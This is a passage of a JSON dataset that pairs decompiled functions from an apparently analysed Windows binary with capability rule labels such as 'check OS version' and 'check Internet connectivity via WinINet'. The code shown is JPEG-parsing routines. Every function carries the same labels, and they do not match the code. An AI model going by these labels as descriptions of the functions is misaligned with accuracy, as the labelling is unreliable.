0x65;\n        (**(*in_EAX + 4))();\n        uStack24 = uStack24 + 1;\n        puVar5 = puVar5 + 0x15;\n    } while( true );\n}\n",
        "token_count": 1875
    },
    "0043ca94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043ca94(void)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t **ppuVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    int32_t iStack40;\n    uint32_t **ppuStack20;\n    \n    ppuVar3 = in_EAX[6];\n    puVar7 = ppuVar3[1];\n    puVar9 = *ppuVar3;\n    if (*(in_EAX[0x6e] + 0x10) == 0) {\n        *(*in_EAX + 0x14) = 0x3e;\n        (***in_EAX)();\n    }\n    if (puVar7 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar7 = ppuVar3[1];\n        puVar9 = *ppuVar3;\n    }\n    puVar7 = puVar7 + -1;\n    uVar2 = *puVar9;\n    puVar9 = puVar9 + 1;\n    if (puVar7 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar7 = ppuVar3[1];\n        puVar9 = *ppuVar3;\n    }\n    puVar7 = puVar7 + -1;\n    uVar1 = *puVar9;\n    puVar9 = puVar9 + 1;\n    if (puVar7 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar7 = ppuVar3[1];\n        puVar9 = *ppuVar3;\n    }\n    puVar7 = puVar7 + -1;\n    uVar5 = *puVar9;\n    puVar9 = puVar9 + 1;\n    iVar4 = *in_EAX;\n    *(iVar4 + 0x14) = 0x67;\n    *(iVar4 + 0x18) = uVar5;\n    (**(*in_EAX + 4))();\n    if (((uVar2 * 0x100 + uVar1 != uVar5 * 2 + 6) || (uVar5 == 0)) || (4 < uVar5)) {\n        *(*in_EAX + 0x14) = 0xb;\n        (***in_EAX)();\n    }\n    in_EAX[0x52] = uVar5;\n    iStack40 = 0;\n    ppuStack20 = in_EAX + 0x53;\n    if (uVar5 != 0) {\n        do {\n            if (puVar7 == NULL) {\n                iVar4 = (*ppuVar3[3])();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                puVar7 = ppuVar3[1];\n                puVar9 = *ppuVar3;\n            }\n            puVar7 = puVar7 + -1;\n            uVar6 = *puVar9;\n            puVar9 = puVar9 + 1;\n            if (puVar7 == NULL) {\n                iVar4 = (*ppuVar3[3])();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                puVar7 = ppuVar3[1];\n                puVar9 = *ppuVar3;\n            }\n            puVar7 = puVar7 + -1;\n            uVar2 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar8 = in_EAX[0x36];\n            for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n                if (uVar6 == *puVar8) goto code_r0x0043cc50;\n                puVar8 = puVar8 + 0x15;\n            }\n            iVar4 = *in_EAX;\n            *(iVar4 + 0x14) = 5;\n            *(iVar4 + 0x18) = uVar6;\n            (***in_EAX)();\ncode_r0x0043cc50:\n            *ppuStack20 = puVar8;\n            puVar8[5] = uVar2 >> 4;\n            puVar8[6] = uVar2 & 0xf;\n            iVar4 = *in_EAX;\n            *(iVar4 + 0x18) = uVar6;\n            *(iVar4 + 0x1c) = puVar8[5];\n            *(iVar4 + 0x20) = puVar8[6];\n            *(*in_EAX + 0x14) = 0x68;\n            (**(*in_EAX + 4))();\n            iStack40 = iStack40 + 1;\n            ppuStack20 = ppuStack20 + 1;\n        } while (iStack40 < uVar5);\n    }\n    if (puVar7 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar7 = ppuVar3[1];\n        puVar9 = *ppuVar3;\n    }\n    puVar7 = puVar7 + -1;\n    puVar10 = puVar9 + 1;\n    in_EAX[100] = *puVar9;\n    if (puVar7 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar7 = ppuVar3[1];\n        puVar10 = *ppuVar3;\n    }\n    puVar7 = puVar7 + -1;\n    puVar9 = puVar10 + 1;\n    in_EAX[0x65] = *puVar10;\n    if (puVar7 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar7 = ppuVar3[1];\n        puVar9 = *ppuVar3;\n    }\n    uVar2 = *puVar9;\n    in_EAX[0x66] = uVar2 >> 4;\n    in_EAX[0x67] = uVar2 & 0xf;\n    iVar4 = *in_EAX;\n    *(iVar4 + 0x18) = in_EAX[100];\n    *(iVar4 + 0x1c) = in_EAX[0x65];\n    *(iVar4 + 0x20) = in_EAX[0x66];\n    *(iVar4 + 0x24) = in_EAX[0x67];\n    *(*in_EAX + 0x14) = 0x69;\n    (**(*in_EAX + 4))();\n    *(in_EAX[0x6e] + 0x14) = 0;\n    in_EAX[0x24] = in_EAX[0x24] + 1;\n    *ppuVar3 = puVar9 + 1;\n    ppuVar3[1] = puVar7 + -1;\n    return 1;\n}\n",
        "token_count": 1685
    },
    "0043cdd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043cdd4(void)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t **ppuVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    int32_t *piVar9;\n    uint8_t *puVar10;\n    uint32_t uStack312;\n    int32_t iStack308;\n    uint8_t *puStack300;\n    uint8_t *puStack296;\n    uchar uStack292;\n    uint8_t uStack291;\n    uint8_t uStack290;\n    uint8_t uStack289;\n    uint8_t uStack288;\n    uint8_t uStack287;\n    uint8_t uStack286;\n    uint8_t uStack285;\n    uint8_t uStack284;\n    uint8_t uStack283;\n    uint8_t uStack282;\n    uint8_t uStack281;\n    uint8_t uStack280;\n    uint8_t uStack279;\n    uint8_t uStack278;\n    uint8_t uStack277;\n    uint8_t uStack276;\n    uint8_t auStack272 [256];\n    \n    ppuVar3 = in_EAX[6];\n    puVar10 = ppuVar3[1];\n    puVar7 = *ppuVar3;\n    if (puVar10 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar10 = ppuVar3[1];\n        puVar7 = *ppuVar3;\n    }\n    puVar10 = puVar10 + -1;\n    uVar1 = *puVar7;\n    puVar7 = puVar7 + 1;\n    if (puVar10 == NULL) {\n        iVar4 = (*ppuVar3[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar10 = ppuVar3[1];\n        puVar7 = *ppuVar3;\n    }\n    puVar10 = puVar10 + -1;\n    puVar8 = puVar7 + 1;\n    iVar4 = uVar1 * 0x100 + *puVar7 + -2;\n    do {\n        if (iVar4 < 0x11) {\n            if (iVar4 != 0) {\n                *(*in_EAX + 0x14) = 0xb;\n                (***in_EAX)();\n            }\n            *ppuVar3 = puVar8;\n            ppuVar3[1] = puVar10;\n            return 1;\n        }\n        if (puVar10 == NULL) {\n            iVar5 = (*ppuVar3[3])();\n            if (iVar5 == 0) {\n                return 0;\n            }\n            puVar10 = ppuVar3[1];\n            puVar8 = *ppuVar3;\n        }\n        puVar10 = puVar10 + -1;\n        uVar1 = *puVar8;\n        uStack312 = uVar1;\n        puVar8 = puVar8 + 1;\n        iVar5 = *in_EAX;\n        *(iVar5 + 0x14) = 0x50;\n        *(iVar5 + 0x18) = uStack312;\n        (**(*in_EAX + 4))();\n        uStack292 = 0;\n        iVar5 = 1;\n        iStack308 = 0;\n        puStack300 = &uStack291;\n        do {\n            if (puVar10 == NULL) {\n                iVar6 = (*ppuVar3[3])();\n                if (iVar6 == 0) {\n                    return 0;\n                }\n                puVar10 = ppuVar3[1];\n                puVar8 = *ppuVar3;\n            }\n            uVar2 = *puVar8;\n            puVar8 = puVar8 + 1;\n            *puStack300 = uVar2;\n            iStack308 = iStack308 + uVar2;\n            puStack300 = puStack300 + 1;\n            puVar10 = puVar10 + -1;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x11);\n        iVar5 = *in_EAX;\n        *(iVar5 + 0x18) = uStack291;\n        *(iVar5 + 0x1c) = uStack290;\n        *(iVar5 + 0x20) = uStack289;\n        *(iVar5 + 0x24) = uStack288;\n        *(iVar5 + 0x28) = uStack287;\n        *(iVar5 + 0x2c) = uStack286;\n        *(iVar5 + 0x30) = uStack285;\n        *(iVar5 + 0x34) = uStack284;\n        *(*in_EAX + 0x14) = 0x56;\n        (**(*in_EAX + 4))();\n        iVar5 = *in_EAX;\n        *(iVar5 + 0x18) = uStack283;\n        *(iVar5 + 0x1c) = uStack282;\n        *(iVar5 + 0x20) = uStack281;\n        *(iVar5 + 0x24) = uStack280;\n        *(iVar5 + 0x28) = uStack279;\n        *(iVar5 + 0x2c) = uStack278;\n        *(iVar5 + 0x30) = uStack277;\n        *(iVar5 + 0x34) = uStack276;\n        *(*in_EAX + 0x14) = 0x56;\n        (**(*in_EAX + 4))();\n        if ((0x100 < iStack308) || (iVar4 + -0x11 < iStack308)) {\n            *(*in_EAX + 0x14) = 8;\n            (***in_EAX)();\n        }\n        iVar5 = 0;\n        puStack296 = auStack272;\n        if (0 < iStack308) {\n            do {\n                if (puVar10 == NULL) {\n                    iVar6 = (*ppuVar3[3])();\n                    if (iVar6 == 0) {\n                        return 0;\n                    }\n                    puVar10 = ppuVar3[1];\n                    puVar8 = *ppuVar3;\n                }\n                puVar10 = puVar10 + -1;\n                *puStack296 = *puVar8;\n                puVar8 = puVar8 + 1;\n                iVar5 = iVar5 + 1;\n                puStack296 = puStack296 + 1;\n            } while (iVar5 < iStack308);\n        }\n        iVar4 = (iVar4 + -0x11) - iStack308;\n        if ((uVar1 & 0x10) == 0) {\n            iVar5 = uStack312 + 0x2d;\n        }\n        else {\n            iVar5 = uStack312 + 0x21;\n            uStack312 = uStack312 - 0x10;\n        }\n        piVar9 = in_EAX + iVar5;\n        if ((uStack312 < 0) || (3 < uStack312)) {\n            iVar5 = *in_EAX;\n            *(iVar5 + 0x14) = 0x1e;\n            *(iVar5 + 0x18) = uStack312;\n            (***in_EAX)();\n        }\n        if (*piVar9 == 0) {\n            iVar5 = fcn.0043e5c4();\n            *piVar9 = iVar5;\n        }\n        fcn.004318c0(*piVar9, &uStack292, 0x11);\n        fcn.004318c0(*piVar9 + 0x11, auStack272, 0x100);\n    } while( true );\n}\n",
        "token_count": 1749
    },
    "0043d108": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043d108(void)\n\n{\n    uint8_t uVar1;\n    uint8_t **ppuVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uint8_t *puVar11;\n    int32_t iStack36;\n    int32_t *piStack20;\n    \n    ppuVar2 = in_EAX[6];\n    puVar11 = ppuVar2[1];\n    puVar9 = *ppuVar2;\n    if (puVar11 == NULL) {\n        iVar4 = (*ppuVar2[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar11 = ppuVar2[1];\n        puVar9 = *ppuVar2;\n    }\n    puVar11 = puVar11 + -1;\n    uVar1 = *puVar9;\n    puVar9 = puVar9 + 1;\n    if (puVar11 == NULL) {\n        iVar4 = (*ppuVar2[3])();\n        if (iVar4 == 0) {\n            return 0;\n        }\n        puVar11 = ppuVar2[1];\n        puVar9 = *ppuVar2;\n    }\n    puVar11 = puVar11 + -1;\n    puVar10 = puVar9 + 1;\n    iVar4 = uVar1 * 0x100 + *puVar9 + -2;\n    do {\n        iVar3 = iVar4;\n        if (iVar3 < 1) {\n            if (iVar3 != 0) {\n                *(*in_EAX + 0x14) = 0xb;\n                (***in_EAX)();\n            }\n            *ppuVar2 = puVar10;\n            ppuVar2[1] = puVar11;\n            return 1;\n        }\n        if (puVar11 == NULL) {\n            iVar4 = (*ppuVar2[3])();\n            if (iVar4 == 0) {\n                return 0;\n            }\n            puVar11 = ppuVar2[1];\n            puVar10 = *ppuVar2;\n        }\n        puVar11 = puVar11 + -1;\n        uVar1 = *puVar10;\n        puVar10 = puVar10 + 1;\n        iVar5 = uVar1 >> 4;\n        uVar7 = uVar1 & 0xf;\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x14) = 0x51;\n        *(iVar4 + 0x18) = uVar7;\n        *(iVar4 + 0x1c) = iVar5;\n        (**(*in_EAX + 4))();\n        if (3 < uVar7) {\n            iVar4 = *in_EAX;\n            *(iVar4 + 0x14) = 0x1f;\n            *(iVar4 + 0x18) = uVar7;\n            (***in_EAX)();\n        }\n        if (in_EAX[uVar7 + 0x29] == 0) {\n            iVar4 = fcn.0043e5ac();\n            in_EAX[uVar7 + 0x29] = iVar4;\n        }\n        puVar8 = in_EAX[uVar7 + 0x29];\n        iStack36 = 0;\n        piStack20 = 0x4a24b0;\n        do {\n            if (iVar5 == 0) {\n                if (puVar11 == NULL) {\n                    iVar4 = (*ppuVar2[3])();\n                    if (iVar4 == 0) {\n                        return 0;\n                    }\n                    puVar11 = ppuVar2[1];\n                    puVar10 = *ppuVar2;\n                }\n                uVar6 = *puVar10;\n            }\n            else {\n                if (puVar11 == NULL) {\n                    iVar4 = (*ppuVar2[3])();\n                    if (iVar4 == 0) {\n                        return 0;\n                    }\n                    puVar11 = ppuVar2[1];\n                    puVar10 = *ppuVar2;\n                }\n                puVar11 = puVar11 + -1;\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                if (puVar11 == NULL) {\n                    iVar4 = (*ppuVar2[3])();\n                    if (iVar4 == 0) {\n                        return 0;\n                    }\n                    puVar11 = ppuVar2[1];\n                    puVar10 = *ppuVar2;\n                }\n                uVar6 = uVar1 * 0x100 + *puVar10;\n            }\n            puVar11 = puVar11 + -1;\n            puVar10 = puVar10 + 1;\n            puVar8[*piStack20] = uVar6;\n            iStack36 = iStack36 + 1;\n            piStack20 = piStack20 + 1;\n        } while (iStack36 < 0x40);\n        if (1 < *(*in_EAX + 0x68)) {\n            iStack36 = 0;\n            do {\n                iVar4 = *in_EAX;\n                *(iVar4 + 0x18) = *puVar8;\n                *(iVar4 + 0x1c) = puVar8[1];\n                *(iVar4 + 0x20) = puVar8[2];\n                *(iVar4 + 0x24) = puVar8[3];\n                *(iVar4 + 0x28) = puVar8[4];\n                *(iVar4 + 0x2c) = puVar8[5];\n                *(iVar4 + 0x30) = puVar8[6];\n                *(iVar4 + 0x34) = puVar8[7];\n                *(*in_EAX + 0x14) = 0x5d;\n                (**(*in_EAX + 4))();\n                iStack36 = iStack36 + 8;\n                puVar8 = puVar8 + 8;\n            } while (iStack36 < 0x40);\n        }\n        iVar4 = iVar3 + -0x41;\n        if (iVar5 != 0) {\n            iVar4 = iVar3 + -0x81;\n        }\n    } while( true );\n}\n",
        "token_count": 1437
    },
    "0043d490": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d490(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    char *in_EDX;\n    uint var_4h;\n    \n    arg_8h = in_ECX + arg_8h;\n    if ((((in_ECX < 0xe) || (*in_EDX != 'J')) || (in_EDX[1] != 'F')) ||\n       (((in_EDX[2] != 'I' || (in_EDX[3] != 'F')) || (in_EDX[4] != '\\0')))) {\n        if (((in_ECX < 6) || (*in_EDX != 'J')) ||\n           ((in_EDX[1] != 'F' || (((in_EDX[2] != 'X' || (in_EDX[3] != 'X')) || (in_EDX[4] != '\\0')))))) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x4d;\n            *(iVar2 + 0x18) = arg_8h;\n            (**(*in_EAX + 4))();\n        }\n        else {\n            cVar1 = in_EDX[5];\n            if (cVar1 == '\\x10') {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x6c;\n                *(iVar2 + 0x18) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n            else if (cVar1 == '\\x11') {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x6d;\n                *(iVar2 + 0x18) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n            else if (cVar1 == '\\x13') {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x6e;\n                *(iVar2 + 0x18) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n            else {\n                iVar2 = *in_EAX;\n                *(iVar2 + 0x14) = 0x59;\n                *(iVar2 + 0x18) = in_EDX[5];\n                *(iVar2 + 0x1c) = arg_8h;\n                (**(*in_EAX + 4))();\n            }\n        }\n    }\n    else {\n        in_EAX[0x46] = 1;\n        *(in_EAX + 0x47) = in_EDX[5];\n        *(in_EAX + 0x11d) = in_EDX[6];\n        *(in_EAX + 0x11e) = in_EDX[7];\n        *(in_EAX + 0x48) = in_EDX[8] * 0x100 + in_EDX[9];\n        *(in_EAX + 0x122) = in_EDX[10] * 0x100 + in_EDX[0xb];\n        if (*(in_EAX + 0x47) != '\\x01') {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x77;\n            *(iVar2 + 0x18) = *(in_EAX + 0x47);\n            *(iVar2 + 0x1c) = *(in_EAX + 0x11d);\n            (**(*in_EAX + 4))();\n        }\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x18) = *(in_EAX + 0x47);\n        *(iVar2 + 0x1c) = *(in_EAX + 0x11d);\n        *(iVar2 + 0x20) = *(in_EAX + 0x48);\n        *(iVar2 + 0x24) = *(in_EAX + 0x122);\n        *(iVar2 + 0x28) = *(in_EAX + 0x11e);\n        *(*in_EAX + 0x14) = 0x57;\n        (**(*in_EAX + 4))();\n        if ((in_EDX[0xc] | in_EDX[0xd]) != 0) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x5a;\n            *(iVar2 + 0x18) = in_EDX[0xc];\n            *(iVar2 + 0x1c) = in_EDX[0xd];\n            (**(*in_EAX + 4))();\n        }\n        if (arg_8h + -0xe != in_EDX[0xc] * in_EDX[0xd] * 3) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x58;\n            *(iVar2 + 0x18) = arg_8h + -0xe;\n            (**(*in_EAX + 4))();\n        }\n    }\n    return;\n}\n",
        "token_count": 1145
    },
    "0043dc3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043dc3c(int32_t param_1)\n\n{\n    uint8_t **ppuVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iStack20;\n    \n    ppuVar1 = in_EAX[6];\n    puVar4 = ppuVar1[1];\n    puVar5 = *ppuVar1;\n    if (puVar4 == NULL) {\n        iVar2 = (*ppuVar1[3])();\n        if (iVar2 == 0) {\n            uVar3 = 0;\n            iStack20 = param_1;\n            goto code_r0x0043dccf;\n        }\n        puVar5 = *ppuVar1;\n        puVar4 = ppuVar1[1];\n    }\n    puVar4 = puVar4 + -1;\n    puVar6 = puVar5 + 1;\n    iStack20 = *puVar5 * 0x100;\n    if (puVar4 == NULL) {\n        iVar2 = (*ppuVar1[3])();\n        if (iVar2 == 0) {\n            uVar3 = 0;\n            goto code_r0x0043dccf;\n        }\n        puVar6 = *ppuVar1;\n        puVar4 = ppuVar1[1];\n    }\n    iStack20 = iStack20 + *puVar6 + -2;\n    iVar2 = *in_EAX;\n    *(iVar2 + 0x14) = 0x5b;\n    *(iVar2 + 0x18) = in_EAX[0x68];\n    *(iVar2 + 0x1c) = iStack20;\n    (**(*in_EAX + 4))();\n    *ppuVar1 = puVar6 + 1;\n    ppuVar1[1] = puVar4 + -1;\n    if (0 < iStack20) {\n        (**(in_EAX[6] + 0x10))();\n    }\n    uVar3 = 1;\ncode_r0x0043dccf:\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 506
    },
    "0043dcd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0043dcd8(void)\n\n{\n    uint8_t uVar1;\n    uint8_t **ppuVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    \n    ppuVar2 = in_EAX[6];\n    puVar5 = *ppuVar2;\n    puVar7 = ppuVar2[1];\n    while( true ) {\n        if (puVar7 == NULL) {\n            iVar3 = (*ppuVar2[3])();\n            if (iVar3 == 0) {\n                uVar4 = 0;\n                goto code_r0x0043dde5;\n            }\n            puVar5 = *ppuVar2;\n            puVar7 = ppuVar2[1];\n        }\n        uVar1 = *puVar5;\n        while( true ) {\n            puVar7 = puVar7 + -1;\n            puVar5 = puVar5 + 1;\n            if (uVar1 == 0xff) break;\n            *(in_EAX[0x6e] + 0x18) = *(in_EAX[0x6e] + 0x18) + 1;\n            *ppuVar2 = puVar5;\n            ppuVar2[1] = puVar7;\n            if (puVar7 == NULL) {\n                iVar3 = (*ppuVar2[3])();\n                if (iVar3 == 0) {\n                    uVar4 = 0;\n                    goto code_r0x0043dde5;\n                }\n                puVar5 = *ppuVar2;\n                puVar7 = ppuVar2[1];\n            }\n            uVar1 = *puVar5;\n        }\n        do {\n            if (puVar7 == NULL) {\n                iVar3 = (*ppuVar2[3])();\n                if (iVar3 == 0) {\n                    uVar4 = 0;\n                    goto code_r0x0043dde5;\n                }\n                puVar5 = *ppuVar2;\n                puVar7 = ppuVar2[1];\n            }\n            uVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar7 = puVar7 + -1;\n        } while (uVar6 == 0xff);\n        if (uVar6 != 0) break;\n        *(in_EAX[0x6e] + 0x18) = *(in_EAX[0x6e] + 0x18) + 2;\n        *ppuVar2 = puVar5;\n        ppuVar2[1] = puVar7;\n    }\n    if (*(in_EAX[0x6e] + 0x18) != 0) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x74;\n        *(iVar3 + 0x18) = *(in_EAX[0x6e] + 0x18);\n        *(iVar3 + 0x1c) = uVar6;\n        (**(*in_EAX + 4))();\n        *(in_EAX[0x6e] + 0x18) = 0;\n    }\n    in_EAX[0x68] = uVar6;\n    *ppuVar2 = puVar5;\n    ppuVar2[1] = puVar7;\n    uVar4 = 1;\ncode_r0x0043dde5:\n    return CONCAT44(in_EAX, uVar4);\n}\n",
        "token_count": 803
    },
    "0043e54c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e54c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        iVar1 = 1;\n        do {\n            (**(*(in_EAX + 4) + 0x24))();\n            iVar1 = iVar1 + -1;\n        } while (0 < iVar1);\n        if (*(in_EAX + 0x10) != 0) {\n            *(in_EAX + 0x14) = 200;\n            *(in_EAX + 0x130) = 0;\n            return;\n        }\n        *(in_EAX + 0x14) = 100;\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0043e58c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e58c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        (**(*(in_EAX + 4) + 0x28))();\n    }\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0x14) = 0;\n    return;\n}\n",
        "token_count": 88
    },
    "0043e6ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e6ac(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x18) == 0) {\n        uVar2 = (***(in_EAX + 4))();\n        *(in_EAX + 0x18) = uVar2;\n    }\n    iVar1 = *(in_EAX + 0x18);\n    *(iVar1 + 8) = 0x43e5dc;\n    *(iVar1 + 0xc) = 0x43e608;\n    *(iVar1 + 0x10) = 0x43e650;\n    *(iVar1 + 0x14) = param_2;\n    return;\n}\n",
        "token_count": 180
    },
    "0043e6ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e6ec(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    if (in_EAX[5] != 100) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x14;\n        *(iVar2 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if ((in_EDX < 0) || (3 < in_EDX)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x1f;\n        *(iVar2 + 0x18) = in_EDX;\n        (***in_EAX)();\n    }\n    piVar1 = in_EAX + in_EDX + 0x11;\n    if (*piVar1 == 0) {\n        iVar2 = fcn.0043e5ac();\n        *piVar1 = iVar2;\n    }\n    iVar2 = 0;\n    do {\n        iVar3 = (*in_ECX * arg_ch + 0x32) / 100;\n        if (iVar3 < 1) {\n            iVar3 = 1;\n        }\n        if (0x7fff < iVar3) {\n            iVar3 = 0x7fff;\n        }\n        if ((arg_8h != 0) && (0xff < iVar3)) {\n            iVar3 = 0xff;\n        }\n        in_ECX = in_ECX + 1;\n        *(*piVar1 + iVar2 * 2) = iVar3;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x40);\n    *(*piVar1 + 0x80) = 0;\n    return;\n}\n",
        "token_count": 444
    },
    "0043e824": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e824(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    if (*in_EDX == 0) {\n        iVar2 = fcn.0043e5c4();\n        *in_EDX = iVar2;\n    }\n    fcn.004318c0(*in_EDX, in_ECX, 0x11);\n    arg_10h = 0;\n    iVar2 = 1;\n    puVar3 = in_ECX + 1;\n    do {\n        iVar2 = iVar2 + 1;\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        arg_10h = arg_10h + uVar1;\n    } while (iVar2 < 0x11);\n    if ((arg_10h < 1) || (0x100 < arg_10h)) {\n        *(*in_EAX + 0x14) = 8;\n        (***in_EAX)();\n    }\n    fcn.004318c0(*in_EDX + 0x11, arg_8h, arg_10h);\n    *(*in_EDX + 0x114) = 0;\n    return;\n}\n",
        "token_count": 327
    },
    "0043e904": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
